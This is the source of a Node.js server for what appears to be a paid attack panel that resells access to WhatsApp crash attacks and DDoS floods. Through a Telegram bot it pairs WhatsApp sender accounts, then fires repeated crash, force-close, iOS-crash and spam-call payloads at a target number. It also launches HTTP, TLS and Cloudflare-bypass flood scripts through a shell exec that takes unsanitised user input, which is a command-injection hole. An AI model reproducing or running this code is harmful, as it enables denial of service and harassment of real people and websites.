const { Token, owner } = require("./settings/config");
const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { exec } = require("child_process");
const cookieParser = require('cookie-parser');
const cors = require('cors');
const crypto = require('crypto');
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    isJidUser,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require("pino");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 2017;

app.use(express.json());
app.use(express.static('public'));
app.use(cookieParser());
app.use(cors());

app.use(express.static(path.join(__dirname, 'public')));

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const bot = new Telegraf(Token);

let dim;

const loadAccounts = () => {
  return fs.existsSync('./db/db.json') ? JSON.parse(fs.readFileSync('./db/db.json')) : [];
};

const isAccountExpired = (date) => {
  if (!date) return false;
  return new Date(date).getTime() < Date.now();
};

const generateToken = (user) => {
  const payload = {
    username: user.username,
    role: user.role,
    timestamp: Date.now()
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
};

const verifyToken = (token) => {
  try {
    const payload = JSON.parse(Buffer.from(token, 'base64').toString());
    const accounts = loadAccounts();
    const user = accounts.find(acc => acc.username === payload.username);
    return user ? payload : null;
  } catch (error) {
    return null;
  }
};

const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const payload = verifyToken(token);
  if (!payload) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  req.user = payload;
  next();
};

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/bug', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'bug.html'));
});

app.get('/ddos', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ddos.html'));
});


app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const accounts = loadAccounts();
  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (!user) {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }

  if (isAccountExpired(user.expiresAt)) {
  const updatedAccounts = accounts.filter(acc => acc.username !== username);
  fs.writeFileSync('./db/db.json', JSON.stringify(updatedAccounts, null, 2));
  return res.status(401).json({ success: false, message: 'Account has expired' });
}

const validRole = ['ADMIN', 'VIP'].includes(user.role.toUpperCase()) ? user.role.toUpperCase() : 'VIP';
const token = generateToken(user);

res.json({
  success: true,
  token,
  user: { username: user.username, role: validRole, expiresAt: user.expiresAt }
});
});

app.post('/api/logout', requireAuth, (req, res) => {
  res.json({ success: true, message: 'Logged out' });
});

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Found ${activeNumbers.length} active WhatsApp sessions`);

  for (const botNumber of activeNumbers) {
    console.log(`Connecting WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "open") {
        console.log(`Bot ${botNumber} connected!`);
        sessions.set(botNumber, sock);
      }
      if (connection === "close") {
        const code = lastDisconnect?.error?.output?.statusCode;
        if (code !== DisconnectReason.loggedOut && code >= 500) {
  console.log("Reconnect diperlukan untuk", botNumber);
  setTimeout(() => reconnectToWhatsApp(botNumber), 5000);
} else {
          sessions.delete(botNumber);
          fs.rmSync(sessionDir, { recursive: true, force: true });
          console.log(`Bot ${botNumber} disconnected & removed.`);
        }
      }
    });

    sock.ev.on("creds.update", saveCreds);
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
        parse_mode: "Markdown"
      });
    } catch (e) {
      console.error("Error:", e.message);
    }
  };

  let paired = false;

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await sock.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, sock);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log("Reconnect diperlukan untuk", botNumber);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        sessions.delete(botNumber);
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

// Fungsi reconnect otomatis tanpa Telegram ctx
const reconnectToWhatsApp = async (botNumber) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "open") {
      console.log(`Bot ${botNumber} reconnected successfully!`);
      sessions.set(botNumber, sock);
      saveActive(botNumber);
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log(`Reconnect retry diperlukan untuk ${botNumber}...`);
        setTimeout(() => reconnectToWhatsApp(botNumber), 5000);
      } else {
        sessions.delete(botNumber);
        fs.rmSync(sessionDir, { recursive: true, force: true });
        console.log(`Bot ${botNumber} disconnected permanently.`);
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) => 
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

bot.use(async (ctx, next) => {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  return next();
});

bot.start((ctx) => {
  ctx.replyWithVideo(
    { url: 'https://files.catbox.moe/tcv2pi.mp4' },
    {
      caption: `
welcome to skid-website, i can only help with this

╭─────────
│ 🔹 /pairing <number>
│ 🔹 /listpairing
│ 🔹 /delpairing <number>
╰──────────`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('👤 Owner', 'https://t.me/Dimzxzzx')],
        [Markup.button.url('📢 Join Channel', 'https://t.me/NulllBytee')]
      ])
    }
  );
});

bot.command("pairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size >= 20) return ctx.reply("⚠️ Max 20 sender already connected.");

  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: `/pairing <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`⏳ Starting pairing to number ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("listpairing", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size === 0) return ctx.reply("no active sender.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delpairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delpairing 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Failed to delete sender.");
  }
});

// Tambah User
bot.command("adduser", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Kamu tidak punya akses.");
  const args = ctx.message.text.split(" ");
  if (args.length < 4) return ctx.reply("⚡ Format: /adduser <username> <password> <durasiHari>");

  const username = args[1];
  const password = args[2];
  const durasiHari = parseInt(args[3]);

  const result = await addUserLogic(username, password, durasiHari);
  ctx.reply(result.msg);
});

// Tambah Admin
bot.command("addadmin", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Kamu tidak punya akses.");
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("⚡ Format: /addadmin <username> <password>");

  const username = args[1];
  const password = args[2];

  const result = await addAdminLogic(username, password);
  ctx.reply(result.msg);
});

// Hapus User
bot.command("deluser", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Kamu tidak punya akses.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("⚡ Format: /deluser <username>");

  const username = args[1];
  const result = deleteUserLogic(username, "USER");
  ctx.reply(result.msg);
});

// Hapus Admin
bot.command("deladmin", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Kamu tidak punya akses.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("⚡ Format: /deladmin <username>");

  const username = args[1];
  const result = deleteUserLogic(username, "ADMIN");
  ctx.reply(result.msg);
});

// Cek User
bot.command("checkuser", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Kamu tidak punya akses.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("⚡ Format: /checkuser <username>");

  const username = args[1];
  const result = checkUserLogic(username);
  if (result.success) {
    ctx.reply(`👤 *${result.user.username}*\nRole: ${result.user.role}\nExpired: ${result.user.expiresAt}`, { parse_mode: "Markdown" });
  } else {
    ctx.reply(result.msg);
  }
});


app.get("/attack/metode", requireAuth,  async (req, res) => {
  try {
    const metode = req.query.metode;
    const target = req.query.target;

    if (!metode || !target) {
      return res.status(400).json({ status: false, message: "'metode' and 'target' required" });
    }

    const isTarget = target.replace(/\D/g, "") + "@s.whatsapp.net";

    if (sessions.size === 0) {
      return res.status(400).json({ status: false, message: "No active sender" });
    }

    const botNumber = [...sessions.keys()][0];
    const sock = sessions.get(botNumber);
    if (!sock) {
      return res.status(400).json({ status: false, message: "Socket not found" });
    }

    switch (metode.toLowerCase()) {
      case "crash":
        for (let i = 0; i < 40; i++) {
          await crash(sock, isTarget);
        }
        break;

      case "foreclose":
        for (let i = 0; i < 40; i++) {
          await FcBeta(sock, isTarget);
          await CallUi(sock, isTarget);
          await fccil(sock, isTarget);
        }
        break;

      case "blank":
        for (let i = 0; i < 40; i++) {
          await blankPayload(sock, isTarget);
        }
        break;

      case "ios":
        for (let i = 0; i < 40; i++) {
          await iosInVis(sock, isTarget);
          await crashNewIos(sock, isTarget);
          await fccil(sock, isTarget);
        }
        break;

      case "delay":
        for (let i = 0; i < 40; i++) {
          await bulldozer2GB(sock, isTarget);
        }
        break;

      case "call":
        for (let i = 0; i < 40; i++) {
          await SpamCall(sock, isTarget);
        }
        break;

      case "combo":
        for (let i = 0; i < 40; i++) {
          await FcBeta(sock, isTarget);
          await CallUi(sock, isTarget);
          await fccil(sock, isTarget);
          await iosInVis(sock, isTarget);
          await crashNewIos(sock, isTarget);
        }
        break;

      default:
        return res.status(400).json({ status: false, message: "Metode tidak dikenali" });
    }

    return res.json({ status: 200, target: target, metode: metode.toLowerCase(), result: "sukses" });

  } catch (err) {
    console.error("Gagal kirim:", err);
    return res.status(500).json({ status: false, message: "Feature Under Construction" });
  }
});

app.get("/ddos", requireAuth, async (req, res) => {
  try {
    const { key, metode, target, time, proxyUrl, threads, rate } = req.query;
    const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const waktu = new Date().toLocaleString();

    if (!key || !metode || !target || !time) {
      return res.status(400).json({ 
        status: false, 
        message: "Required parameters: key, metode, target, time" 
      });
    }

    if (key !== "NullByte") {
      return res.status(403).json({ 
        status: false, 
        message: "Incorrect API key" 
      });
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({ 
        status: false, 
        message: "Time must be 1 - 500 seconds" 
      });
    }

    const threadCount = parseInt(threads) || 100;
    const rateCount = parseInt(rate) || 1000000;

    let proxyStatus = "Using existing proxies";
    if (proxyUrl && proxyUrl.trim()) {
      try {
        const proxyResp = await axios.get(proxyUrl);
        const proxyFile = path.join(__dirname, "proxy.txt");
        fs.writeFileSync(proxyFile, proxyResp.data);
        proxyStatus = `Proxy fetched from URL: ${proxyUrl}`;
      } catch (err) {
        console.error("Failed to fetch proxy list:", err.message);
        return res.status(500).json({
          status: false,
          message: "Failed to fetch proxy list from given URL"
        });
      }
    }

    let command;
    if (metode === "BYPASS") {
      command = `node ./methods/BYPASS.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "CIBI") {
      command = `node ./methods/CIBI.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "FLOOD") {
      command = `node ./methods/FLOOD.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "GLORY") {
      command = `node ./methods/GLORY.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "HTTPS") {
      command = `node ./methods/HTTPS.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "HTTPX") {
      command = `node ./methods/HTTPX.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "HTTP-X") {
      command = `node ./methods/HTTP-X.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "RAW") {
      command = `node ./methods/RAW.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "TLS") {
      command = `node ./methods/TLS.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "UAM") {
      command = `node ./methods/UAM.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "CF") {
      command = `node ./methods/CF.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "H2") {
      command = `node ./methods/H2.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "CF-BYPASS") {
      command = `node ./methods/CF-BYPASS.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else {
      return res.status(400).json({ 
        status: false, 
        message: "Method not supported" 
      });
    }

    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(` Error: ${error.message}`);
        return;
      }
      if (stderr) console.warn(`Stderr: ${stderr}`);
      console.log(`Output: ${stdout}`);
    });

    return res.json({
      status: true,
      Target: target,
      Method: metode,
      Time: duration,
      Threads: threadCount,
      Rate: rateCount,
      proxyStatus: proxyStatus,
      News: "Success"
    });

  } catch (err) {
    console.error("error:", err);
    return res.status(500).json({
      status: false,
      message: "Internal server error"
    });
  }
});

// ====== Tambahan di atas ======
const bcrypt = require("bcrypt");
const low = require("lowdb");
const FileSync = require("lowdb/adapters/FileSync");

const adapter = new FileSync("./db/users.json");
const db = low(adapter);
db.defaults({ users: [] }).write();

function isAdmin(req, res, next) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  const payload = verifyToken(token);
  if (!payload || payload.role !== "ADMIN") {
    return res.status(403).json({ success: false, message: "Forbidden" });
  }
  req.user = payload;
  next();
}

// ====== Logic User/Admin ======
async function addUserLogic(username, password, durasiHari) {
  if (db.get("users").find({ username }).value()) {
    return { success: false, msg: "Username sudah ada" };
  }
  const hashedPassword = await bcrypt.hash(password, 10);
  const expiresAt = new Date(Date.now() + durasiHari * 24 * 60 * 60 * 1000);
  const newUser = { username, password: hashedPassword, role: "USER", expiresAt: expiresAt.toISOString() };
  db.get("users").push(newUser).write();
  return { success: true, msg: `User ${username} berhasil ditambahkan selama ${durasiHari} hari.` };
}

async function addAdminLogic(username, password) {
  if (db.get("users").find({ username }).value()) {
    return { success: false, msg: "Username sudah ada" };
  }
  const hashedPassword = await bcrypt.hash(password, 10);
  const expiresAt = new Date(Date.now() + 3650 * 24 * 60 * 60 * 1000);
  const newAdmin = { username, password: hashedPassword, role: "ADMIN", expiresAt: expiresAt.toISOString() };
  db.get("users").push(newAdmin).write();
  return { success: true, msg: `Admin (Reseller) ${username} berhasil ditambahkan.` };
}

function deleteUserLogic(username, role = "USER") {
  const result = db.get("users").remove({ username: username, role: role }).write();
  if (result.length > 0) {
    return { success: true, msg: `Akun ${role} ${username} berhasil dihapus.` };
  } else {
    return { success: false, msg: `Akun ${role} ${username} tidak ditemukan.` };
  }
}

function checkUserLogic(username) {
  const user = db.get("users").find({ username: username }).value();
  if (user) {
    return { success: true, user: user };
  } else {
    return { success: false, msg: `User ${username} tidak ditemukan.` };
  }
}

// ====== Endpoint Admin ======
app.get("/admin/checkuser/:username", isAdmin, (req, res) => {
  const user = db.get("users").find({ username: req.params.username }).value();
  if (!user) return res.status(404).json({ msg: "User tidak ditemukan" });
  res.json(user);
});

app.post("/admin/adduser", isAdmin, async (req, res) => {
  const { username, password, durasiHari } = req.body;
  const result = await addUserLogic(username, password, durasiHari);
  res.status(result.success ? 201 : 400).json({ msg: result.msg });
});

app.delete("/admin/deluser/:username", isAdmin, (req, res) => {
  const result = deleteUserLogic(req.params.username, "USER");
  res.status(result.success ? 200 : 404).json({ msg: result.msg });
});

app.post("/admin/addadmin", isAdmin, async (req, res) => {
  const { username, password } = req.body;
  const result = await addAdminLogic(username, password);
  res.status(result.success ? 201 : 400).json({ msg: result.msg });
});

app.delete("/admin/deladmin/:username", isAdmin, (req, res) => {
  const result = deleteUserLogic(req.params.username, "ADMIN");
  res.status(result.success ? 200 : 404).json({ msg: result.msg });
});

app.use((req, res, next) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Internal Server Error'
  });
});

initializeWhatsAppConnections();
bot.launch();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(` Access dashboard: https://nullbyte.space/dashboard`);
  console.log(` Access DDOS panel: https://nullbyte.space/ddos-dashboard`);
  console.log(` Public URL: https://nullbyte.space/`);
});

